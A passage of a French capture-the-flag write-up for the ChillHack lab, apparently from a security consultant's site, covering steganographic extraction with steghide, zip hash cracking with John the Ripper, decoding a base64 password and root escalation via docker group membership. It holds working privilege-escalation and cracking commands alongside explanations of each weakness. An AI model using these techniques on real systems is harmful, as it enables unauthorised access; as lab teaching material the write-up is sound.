+<p>On télécharge cette image depuis notre machine d'attaque (le tunnel SSH est actif, <code>localhost:9001</code> est accessible) :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>wget<span class="w"> </span>http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_oeOACeoqrH.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_oeOACeoqrH.png" /></a></p>
+<h3 id="etape-9-extraction-de-credentials-par-steganographie">Étape 9 : Extraction de credentials par stéganographie<a class="headerlink" href="#etape-9-extraction-de-credentials-par-steganographie" title="Permanent link">&para;</a></h3>
+<p>L'image téléchargée semble banale, mais les CTF utilisent souvent la stéganographie pour dissimuler des données dans des fichiers médias. On tente une extraction avec steghide :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>steghide<span class="w"> </span>extract<span class="w"> </span>-sf<span class="w"> </span>hacker-with-laptop_23-2147985341.jpg
+</span></code></pre></div>
+<p>Steghide demande une passphrase. On appuie simplement sur <strong>Entrée</strong> sans rien saisir : l'image n'a pas de protection par mot de passe.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Enter passphrase:
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>wrote extracted data to "backup.zip".
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_bT2wRQraq6.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_bT2wRQraq6.png" /></a></p>
+<p>Un fichier <code>backup.zip</code> est extrait, mais il est protégé par mot de passe. On ne peut pas le deviner directement, donc on extrait son hash pour le craquer hors ligne :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>zip2john<span class="w"> </span>backup.zip<span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_VF77HEFsfh.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_VF77HEFsfh.png" /></a></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_tcaCL2UWKg.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_tcaCL2UWKg.png" /></a></p>
+<p>John trouve le mot de passe : <code>pass1word</code>. On décompresse l'archive en le saisissant quand il est demandé :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>unzip<span class="w"> </span>backup.zip
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_ffhjTAvk5L.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_ffhjTAvk5L.png" /></a></p>
+<p>On lit le fichier extrait :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>cat<span class="w"> </span>source_code.php
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_GyUqt4YTu6.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_GyUqt4YTu6.png" /></a></p>
+<p>C'est le code source du Customer Portal. On y voit que le mot de passe est comparé à sa valeur encodée en base64 :</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="x">if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")</span>
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/u3o5cgwTGx.png"><img alt="ChillHack" src="../screen/ChillHack/u3o5cgwTGx.png" /></a></p>
+<p>On décode cette chaîne pour obtenir le mot de passe en clair :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"IWQwbnRLbjB3bVlwQHNzdzByZA=="</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_bVuyyGOlPj.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_bVuyyGOlPj.png" /></a></p>
+<p>Rien dans le code source ne confirme à qui appartient ce mot de passe. On suppose qu'il s'agit de celui d'<code>anurodh</code>, le second nom d'utilisateur repéré dans <code>note.txt</code> à l'étape 2 : <code>!d0ntKn0wmYp@ssw0rd</code></p>
+<div class="admonition warning">
+<p class="admonition-title">Observation clé</p>
+<p>Le mot de passe est stocké dans le code source PHP simplement encodé en base64. L'encodage base64 n'est pas du chiffrement : il n'offre aucune protection réelle et se décode instantanément. Tout secret exposé dans du code source est compromis.</p>
+</div>
+<h3 id="etape-10-escalade-via-docker-anurodh-root">Étape 10 : Escalade via Docker (anurodh → root)<a class="headerlink" href="#etape-10-escalade-via-docker-anurodh-root" title="Permanent link">&para;</a></h3>
+<p>On teste maintenant l'hypothèse formulée à l'étape précédente. Depuis notre session SSH en tant qu'apaar, on bascule sur le compte <code>anurodh</code>, nom d'utilisateur découvert dans <code>note.txt</code> à l'étape 2, avec le mot de passe récupéré :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>su<span class="w"> </span>anurodh
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Password: !d0ntKn0wmYp@ssw0rd
+</span></code></pre></div>
+<p>La connexion réussit, confirmant l'hypothèse : c'est bien le mot de passe d'anurodh. On vérifie les groupes de cet utilisateur :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>id
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_SYsvl1x3tQ.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_SYsvl1x3tQ.png" /></a></p>
+<p>Anurodh appartient au groupe <code>docker</code>. C'est un vecteur d'escalade classique : tout membre du groupe docker peut monter le système de fichiers de l'hôte dans un conteneur et obtenir un accès root complet. On exploite donc ce vecteur :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>sh
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Pourquoi le groupe docker est-il équivalent à root ?</p>
+<p>La commande monte <code>/</code> (la racine du système hôte) dans <code>/mnt</code> du conteneur Alpine. <code>chroot /mnt</code> change la racine du processus vers ce point de montage : on se retrouve dans un shell qui voit tout le système de fichiers hôte comme sa propre racine, sans aucune restriction. Docker n'applique aucun contrôle d'accès supplémentaire pour les membres du groupe.</p>
+</div>
+<p><a href="../screen/ChillHack/WindowsTerminal_ohx67Q1q9B.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_ohx67Q1q9B.png" /></a></p>
+<p><code>whoami</code> confirme : on est root. On lit le flag :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nb">cd</span><span class="w"> </span>/root
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>ls
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>cat<span class="w"> </span>proof.txt
+</span></code></pre></div>
+<p><a href="../screen/ChillHack/WindowsTerminal_Z4VZKpGS0T.png"><img alt="ChillHack" src="../screen/ChillHack/WindowsTerminal_Z4VZKpGS0T.png" /></a></p>
+<div class="admonition success">
+<p class="admonition-title">Réponse</p>
+<p><strong>Root flag</strong> → <code>{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</code></p>
+</div>
+<h2 id="synthese-technique">Synthèse technique<a class="headerlink" href="#synthese-technique" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Catégorie</th>
+<th>Détails</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vulnérabilités identifiées</strong></td>
+<td>FTP anonyme, injection de commandes avec filtre bypassable, SQL injection sur portail interne, credentials en base64 dans archive stéganographiée, appartenance au groupe docker</td>
+</tr>
+<tr>
+<td><strong>Techniques utilisées</strong></td>
+<td>Bypass de filtre par backslash, reverse shell Python, déploiement de clé SSH, port forwarding SSH, SQL injection auth bypass, steghide, zip2john, Docker escape</td>
+</tr>
+<tr>
+<td><strong>Outils employés</strong></td>
+<td>Nmap, Gobuster, FTP, Netcat, Python, SSH, steghide, zip2john, John the Ripper, Docker</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition abstract">
+<p class="admonition-title">Ce qu'il faut retenir</p>
+<ol>
+<li>Un filtre par liste noire est contournable par échappement : <code>l\s</code> n'est pas <code>ls</code> pour le filtre, mais l'est pour le shell.</li>
+<li>Un script sudo qui exécute des entrées utilisateur sans validation est une injection de commandes directe, quel que soit son objectif initial.</li>
+<li>L'appartenance au groupe docker est une élévation de privilèges garantie : monter <code>/</code> dans un conteneur donne un accès root complet à l'hôte.</li>
+<li>Un service accessible uniquement en interne reste exploitable via un tunnel SSH, sans aucune modification de la cible.</li>
+<li>Base64 n'est pas du chiffrement : une chaîne base64 dans du code source se décode en une seconde et expose le secret en clair.</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Retour en haut de la page
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024-2026 · Managone · <a href="https://odonia.fr" target="_blank" rel="noopener">Odonia Cyber</a>, cybersécurité pour les PME et ETI
+
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/mathisg/" target="_blank" rel="noopener" title="Mathis · LinkedIn (fondateur Odonia Cyber)" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/managone/writeups" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://odonia.fr" target="_blank" rel="noopener" title="Odonia Cyber · mon cabinet de cybersécurité pour les PME et ETI" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.a5f9d56c.min.js"></script>
+      
+        <script src="../../javascripts/clipboard-fix.js"></script>
+      
+    
+  </body>
+</html>
